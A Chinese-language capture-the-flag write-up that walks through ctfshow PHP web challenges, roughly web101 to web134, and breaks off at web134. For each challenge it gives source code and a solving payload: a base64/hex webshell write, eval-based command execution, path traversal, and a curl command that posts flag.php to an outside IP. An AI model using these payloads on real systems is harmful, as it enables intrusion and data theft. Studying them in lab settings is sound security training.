题目描述:修补100题非预期,替换0x2d\n修补了上一题通过直接命令执行或者var_dump打印类的方法\n我们可以尝试使用反射类的方法，利用题目给出的('ctfshow')来拼接打印类\npayload:\n?v1=1\u0026v2=echo new Reflectionclass\u0026v3=; 这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag\npayload:\n1a = \"fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42\" 2b = a.replace(\"0x2d\",\"-\") 3hex = [\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\"] 4for i in hex: 5 print(\"ctfshow{\"+b+i+\"}\") web102 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 20:59:43 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST['v1']; 15$v2 = $_GET['v2']; 16$v3 = $_GET['v3']; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 file_put_contents($v3,$str); 23} 24else{ 25 die('hacker'); 26} 27 28 29?\u003e 分析一下这段代码\n首先这段代码会接收三个参数v1,v2,v3\n根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关\n所以想要进入判断，我们首先要使v2为数字\n接着会通过substr对v2前两段进行截断并赋值给s\n下一步就会将v1和s都传入call_user_func函数\ncall_user_func函数有什么用呢?\ncall_user_func 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。\nfunction greet($name) {\rreturn \"Hello, $name!\";\r}\r$message = call_user_func('greet', 'John');\recho $message; 我们先不管他怎么利用，接着往下看\n最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag\n但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？\n假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。\n那怎么进行格式转换呢?\n我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。\n经过尝试我们可以得到符合条件的代码\n\u003c?=`cat *`;\rbase64:PD89YGNhdCAqYDs= (转hex去掉=)\rhex:5044383959474E6864434171594473 我们需要在hex前面随便加两位数字来绕过截断\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026v3=php://filter/write=convert.base64-decode/resource=1.php web103 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-23 21:03:24 9 10*/ 11 12 13highlight_file(__FILE__); 14$v1 = $_POST['v1']; 15$v2 = $_GET['v2']; 16$v3 = $_GET['v3']; 17$v4 = is_numeric($v2) and is_numeric($v3); 18if($v4){ 19 $s = substr($v2,2); 20 $str = call_user_func($v1,$s); 21 echo $str; 22 if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){ 23 file_put_contents($v3,$str); 24 } 25 else{ 26 die('Sorry'); 27 } 28} 29else{ 30 die('hacker'); 31} 32 33?\u003e 这题相比上一题多了一个过滤\nif(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\rfile_put_contents($v3,$str);\r}\relse{\rdie('Sorry');\r} 继续用上题的方法即可\npayload:\nv1=hex2bin\rv2=665044383959474E6864434171594473\u0026v3=php://filter/write=convert.base64-decode/resource=1.php web104 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:27:20 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\"flag.php\"); 15 16if(isset($_POST['v1']) \u0026\u0026 isset($_GET['v2'])){ 17 $v1 = $_POST['v1']; 18 $v2 = $_GET['v2']; 19 if(sha1($v1)==sha1($v2)){ 20 echo $flag; 21 } 22} 23 24 25 26?\u003e 使v1=v2即可\nv1=1\rv2=1 web105 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:34:07 9 10*/ 11 12highlight_file(__FILE__); 13include('flag.php'); 14error_reporting(0); 15$error='你还想要flag嘛？'; 16$suces='既然你想要那给你吧！'; 17foreach($_GET as $key =\u003e $value){ 18 if($key==='error'){ 19 die(\"what are you doing?!\"); 20 } 21 $$key=$$value; 22}foreach($_POST as $key =\u003e $value){ 23 if($value==='flag'){ 24 die(\"what are you doing?!\"); 25 } 26 $$key=$$value; 27} 28if(!($_POST['flag']==$flag)){ 29 die($error); 30} 31echo \"your are good\".$flag.\"\\n\"; 32die($suces); 33 34?\u003e 本题考查变量覆盖和die()的知识\n$$a = $$b可以类似于，将$a的地址指向$b\n所以无论$b怎么改变值，$a的值都会和$b一样\ndie()函数虽然会终止程序，但同时也会输出括号内的终止提示信息\n方法一：\n本题利用变量覆盖和die()函数的特性\n先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=\u003eflag的地址 再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=\u003eflag的地址 此时无论进入哪个die()函数，都可以输出$flag的值 payload:\nGet: suces=flag\rPOST: error=suces 方法二：\nGet: ?suces=flag\u0026flag= 先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值\nweb106 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: atao 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 22:38:27 9 10*/ 11 12 13highlight_file(__FILE__); 14include(\"flag.php\"); 15 16if(isset($_POST['v1']) \u0026\u0026 isset($_GET['v2'])){ 17 $v1 = $_POST['v1']; 18 $v2 = $_GET['v2']; 19 if(sha1($v1)==sha1($v2) \u0026\u0026 $v1!=$v2){ 20 echo $flag; 21 } 22} 23 24 25 26?\u003e 我们使用数组绕过即可\nv1[]=1\rv2[]=0 web107 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:24:14 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\"flag.php\"); 16 17if(isset($_POST['v1'])){ 18 $v1 = $_POST['v1']; 19 $v3 = $_GET['v3']; 20 parse_str($v1,$v2); 21 if($v2['flag']==md5($v3)){ 22 echo $flag; 23 } 24 25} 26 27 28 29?\u003e parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。\n1\u003c?php 2 //parse_str()将查询的字符串解析到变量中 3 parse_str(\"name=Gopal K Verma\u0026age=45\"); 4 5 echo $name.\"\n\"; 6 echo $age; 7?\u003e 其实实际上就是md5弱比较\n方法一：随便给一个值给flag，将MD5转换后的值赋给v3\nv3=1\rv1=flag=c4ca4238a0b923820dcc509a6f75849b 方法二:数组绕过\nv3[]=1\rv1=\"flag[]=1\" web108 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-28 23:53:55 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15include(\"flag.php\"); 16 17if (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE) { 18 die('error'); 19 20} 21//只有36d的人才能看到flag 22if(intval(strrev($_GET['c']))==0x36d){ 23 echo $flag; 24} 25 26?\u003e 题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。\npayload\nGET:?c=a%00778 web109 考点:php原生类利用\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:02:34 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2'])){ 16 $v1 = $_GET['v1']; 17 $v2 = $_GET['v2']; 18 19 if(preg_match('/[a-zA-Z]+/', $v1) \u0026\u0026 preg_match('/[a-zA-Z]+/', $v2)){ 20 eval(\"echo new $v1($v2());\"); 21 } 22 23} 24 25?\u003e 关于php原生类的利用\nhttps://blog.csdn.net/weixin_54902210/article/details/124689580\npayload:\nv1=Exception\u0026v2=system('cat fl36dg.txt') or\rv1=Reflectionclass\u0026v2=system('cat fl36dg.txt') 其他的原生类也行，比如Error\nweb110 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-29 22:49:10 9 10*/ 11 12 13highlight_file(__FILE__); 14error_reporting(0); 15if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2'])){ 16 $v1 = $_GET['v1']; 17 $v2 = $_GET['v2']; 18 19 if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){ 20 die(\"error v1\"); 21 } 22 if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){ 23 die(\"error v2\"); 24 } 25 26 eval(\"echo new $v1($v2());\"); 27 28} 29 30?\u003e 依旧是对php原生类的利用\n但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload\n类FilesystemIterator可以用来遍历目录，需要一个路径参数\n函数getcwd可以返回当前工作路径且不需要参数，由此可以构造payload\nhttps://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator\u0026v2=getcwd 得到flag的位置,直接访问即可\nweb111 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 02:41:40 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14include(\"flag.php\"); 15 16function getFlag(\u0026$v1,\u0026$v2){ 17 eval(\"$$v1 = \u0026$$v2;\"); 18 var_dump($$v1); 19} 20 21 22if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2'])){ 23 $v1 = $_GET['v1']; 24 $v2 = $_GET['v2']; 25 26 if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u003c|\\\u003e/', $v1)){ 27 die(\"error v1\"); 28 } 29 if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u003c|\\\u003e/', $v2)){ 30 die(\"error v2\"); 31 } 32 33 if(preg_match('/ctfshow/', $v1)){ 34 getFlag($v1,$v2); 35 } 36 37} 38?\u003e 这题是关于变量覆盖的题目\n由于\nif(preg_match('/ctfshow/', $v1)){\rgetFlag($v1,$v2);\r} 所有我们可以确定v1的值只能为ctfshow\n接下来看getFlag函数\nfunction getFlag(\u0026$v1,\u0026$v2){\reval(\"$$v1 = \u0026$$v2;\");\rvar_dump($$v1);\r} getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2\nvar_dump则会输出变量的相关信息\n那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag\n但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面\n所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。\n构造payload把所有全局变量全输出来\nhttps://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow\u0026v2=GLOBALS web112 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:49 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){ 16 die(\"hacker!\"); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET['file']; 22if(!is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \"hacker!\"; 26} 这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器\n如 php://filter（这里也用不到过滤器）\nhttps://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php 其他\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\rphp://filter/read=convert.quoted-printable-encode/resource=flag.php\rcompress.zlib://flag.php 为什么不能直接输入flag.php呢?\nif(!is_file($file)){\rhighlight_file(filter($file));\r}else{\recho \"hacker!\";\r} 那是因为is_file(“flag.php”)==true，输出hacker！\nweb113 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:52 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){ 16 die('hacker!'); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET['file']; 22if(! is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \"hacker!\"; 26} 这题相比上题把filter过滤了\n我们可以考虑使用其他伪协议\n如 compress.zlib://\ncompress.zlib://flag.php 官方题解 目录溢出导致is_file认为这不是一个文件\n/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\rroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\rc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\rself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\rlf/root/proc/self/root/var/www/html/flag.php web114 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:02:53 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14function filter($file){ 15 if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){ 16 die('hacker!'); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET['file']; 22echo \"师傅们居然tql都是非预期 哼！\"; 23if(! is_file($file)){ 24 highlight_file(filter($file)); 25}else{ 26 echo \"hacker!\"; 27} 这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了\nphp://filter/resource=flag.php 直接读就完事了\nweb115 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:08:19 9 10*/ 11 12include('flag.php'); 13highlight_file(__FILE__); 14error_reporting(0); 15function filter($num){ 16 $num=str_replace(\"0x\",\"1\",$num); 17 $num=str_replace(\"0\",\"1\",$num); 18 $num=str_replace(\".\",\"1\",$num); 19 $num=str_replace(\"e\",\"1\",$num); 20 $num=str_replace(\"+\",\"1\",$num); 21 return $num; 22} 23$num=$_GET['num']; 24if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){ 25 if($num=='36'){ 26 echo $flag; 27 }else{ 28 echo \"hacker!!\"; 29 } 30}else{ 31 echo \"hacker!!!\"; 32} 参考文章:ctfshow学习记录-web入门（php特性109-115\u0026123\u0026125-126）_ctfshow web109-CSDN博客\nis_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!=‘36’\n但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的\n我们这里考虑使用%0c（换页符）进行绕过\n同时使用%0c也可以绕过filter。\n接下来再看第二个if判断，这是看起来很矛盾的一个判断。\n来具体看一下!==的定义，只要类型不同就不全等。\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。 ——《php手册》语言参考-运算符-比较运算符\n也就是说!==时不进行类型转换。\n所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。\npayload：\n?num=%0c36 web123 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14highlight_file(__FILE__); 15include(\"flag.php\"); 16$a=$_SERVER['argv']; 17$c=$_POST['fun']; 18if(isset($_POST['CTF_SHOW'])\u0026\u0026isset($_POST['CTF_SHOW.COM'])\u0026\u0026!isset($_GET['fl0g'])){ 19 if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)\u0026\u0026$c\u003c=18){ 20 eval(\"$c\".\";\"); 21 if($fl0g===\"flag_give_me\"){ 22 echo $flag; 23 } 24 } 25} 26?\u003e 这题其实根本不用理会\nif($fl0g===\"flag_give_me\"){\recho $flag;\r} 这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag\n这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换\npayload:\nPOST:CTF_SHOW=1\u0026CTF[SHOW.COM=1\u0026fun= echo $flag web125 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\"flag.php\"); 15$a=$_SERVER['argv']; 16$c=$_POST['fun']; 17if(isset($_POST['CTF_SHOW'])\u0026\u0026isset($_POST['CTF_SHOW.COM'])\u0026\u0026!isset($_GET['fl0g'])){ 18 if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)\u0026\u0026$c\u003c=16){ 19 eval(\"$c\".\";\"); 20 if($fl0g===\"flag_give_me\"){ 21 echo $flag; 22 } 23 } 24} 25?\u003e 这题把上题的echo方法和flag关键词ban了\n考虑通过二次传参的方法读flag\n我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了\n后面尝试highlight_file方法成功读到flag\npayload:\nPOST CTF_SHOW=1\u0026CTF[SHOW.COM=1\u0026fun=highlight_file($_GET[1])\rGET 1=flag.php 其他的 payload：\n1POST CTF_SHOW=\u0026CTF[SHOW.COM=\u0026fun=var_export(get_defined_vars()) web126 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\"flag.php\"); 15$a=$_SERVER['argv']; 16$c=$_POST['fun']; 17if(isset($_POST['CTF_SHOW'])\u0026\u0026isset($_POST['CTF_SHOW.COM'])\u0026\u0026!isset($_GET['fl0g'])){ 18 if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) \u0026\u0026 strlen($c)\u003c=16){ 19 eval(\"$c\".\";\"); 20 if($fl0g===\"flag_give_me\"){ 21 echo $flag; 22 } 23 } 24} 基本上ban掉了能读文件的函数\n参考ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客\npayload:\nget：?$fl0g=flag_give_me;\rpost：CTF_SHOW=\u0026CTF[SHOW.COM=\u0026fun=eval($a[0])\ror\rGET:?$fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026CTF[SHOW.COM=\u0026fun=assert($a[0]) 这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET[‘fl0g’]) 仍然会返回 false，即没有检测到 fl0g 参数。\npost 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST[‘CTF_SHOW’]) \u0026\u0026 isset($_POST[‘CTF_SHOW.COM’]) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。\n准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER[“QUERY_STRING”] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。\n当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER[‘argv’] 中。 在这种配置下，$_SERVER[‘argv’][0] 包含了整个查询字符串，即 ‘$fl0g=flag_give_me;’。\n在 eval(\"$c;”); 中实际执行的是 eval(’eval($a[0]);’);，因为 $a[0] 是 ‘$fl0g=flag_give_me;’，这相当于执行了 eval(’$fl0g=flag_give_me;’);，这样就定义了变量 $fl0g 并赋值为 ‘flag_give_me’。\n最后 判断 if($fl0g === “flag_give_me”)，因为 $fl0g 被正确地设置为了 ‘flag_give_me’，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。\n其他payload:\nGET:?a=1+fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026CTF[SHOW.COM=\u0026fun=parse_str($a[1]) 也同样是为了使fl0g=flag_give_me\nweb127 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-10 21:52:49 9 10*/ 11 12 13error_reporting(0); 14include(\"flag.php\"); 15highlight_file(__FILE__); 16$ctf_show = md5($flag); 17$url = $_SERVER['QUERY_STRING']; 18 19 20//特殊字符检测 21function waf($url){ 22 if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\\u003c|\\,|\\\u003e|\\.|\\\\\\|\\//', $url)){ 23 return true; 24 }else{ 25 return false; 26 } 27} 28 29if(waf($url)){ 30 die(\"嗯哼？\"); 31}else{ 32 extract($_GET); 33} 34 35 36if($ctf_show==='ilove36d'){ 37 echo $flag; 38} 变量覆盖\n由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_\npayload:\nctf%20show=ilove36d web128 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-12 19:49:05 9 10*/ 11 12 13error_reporting(0); 14include(\"flag.php\"); 15highlight_file(__FILE__); 16 17$f1 = $_GET['f1']; 18$f2 = $_GET['f2']; 19 20if(check($f1)){ 21 var_dump(call_user_func(call_user_func($f1,$f2))); 22}else{ 23 echo \"嗯哼？\"; 24} 25 26 27 28function check($str){ 29 return !preg_match('/[0-9]|[a-z]/i', $str); 30} 什么是Gettext函数\nPHP: Gettext - Manual\n骚操作\n小知识点： _()是一个函数\r_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\rget_defined_vars()函数\rget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\rpayload: ?f1=_\u0026f2=get_defined_vars web129 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 03:18:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15if(isset($_GET['f'])){ 16 $f = $_GET['f']; 17 if(stripos($f, 'ctfshow')\u003e0){ 18 echo readfile($f); 19 } 20} stripos() 函数查找字符串在另一字符串中第一次出现的位置\n所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件\n可以联想到目录穿越\npayload:\n/ctfshow/../../../../../../../../../../var/www/html/flag.php web130 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\"flag.php\"); 16if(isset($_POST['f'])){ 17 $f = $_POST['f']; 18 19 if(preg_match('/.+?ctfshow/is', $f)){ 20 die('bye!'); 21 } 22 if(stripos($f, 'ctfshow') === FALSE){ 23 die('bye!!'); 24 } 25 26 echo $flag; 27 28} ‘/.+?ctfshow/is’ 后面的i表示大小写匹配，s表示忽略换行符，单行匹配\n在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次\n所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确\n再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可\npayload\nPOST f=ctfshow web131 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\"flag.php\"); 16if(isset($_POST['f'])){ 17 $f = (String)$_POST['f']; 18 19 if(preg_match('/.+?ctfshow/is', $f)){ 20 die('bye!'); 21 } 22 if(stripos($f,'36Dctfshow') === FALSE){ 23 die('bye!!'); 24 } 25 26 echo $flag; 27 28} 正则表达式溢出 https://www.laruence.com/2010/06/08/1579.html\npayload:\n#payload:\r\u003c?php\recho str_repeat('very', '250000').'36Dctfshow'; 不宜过多，过多会\nweb132 /admin\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 06:22:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 20:05:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14#error_reporting(0); 15include(\"flag.php\"); 16highlight_file(__FILE__); 17 18 19if(isset($_GET['username']) \u0026\u0026 isset($_GET['password']) \u0026\u0026 isset($_GET['code'])){ 20 $username = (String)$_GET['username']; 21 $password = (String)$_GET['password']; 22 $code = (String)$_GET['code']; 23 24 if($code === mt_rand(1,0x36D) \u0026\u0026 $password === $flag || $username ===\"admin\"){ 25 26 if($code == 'admin'){ 27 echo $flag; 28 } 29 30 } 31} 第一个判断后面用的是或\n也就是说只要使username等于admin即可，前面两个无所谓了\n第二个判断让code等于admin即可\npayload：\nGET:?code=admin\u0026username=admin\u0026password= web133 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 16:43:44 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14//flag.php 15if($F = @$_GET['F']){ 16 if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){ 17 eval(substr($F,0,6)); 18 }else{ 19 die(\"6个字母都还不够呀?!\"); 20 } 21} ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园\n这其实是一道关于变量覆盖的题目\nget传参 F=`$F `;sleep 3\r经过substr($F,0,6)截取后 得到 `$F `;\r也就是会执行 eval(\"`$F `;\");\r我们把原来的$F带进去\reval(\"``$F `;sleep 3`\");\r也就是说最终会执行 ` `$F `;sleep 3 ` == shell_exec(\"`$F `;sleep 3\");\r前面的命令我们不需要管，但是后面的命令我们可以自由控制。\r这样就在服务器上成功执行了 sleep 3\r所以 最后就是一道无回显的RCE题目了 payload:\n`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/ curl外带rce\nweb134 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-14 23:01:06 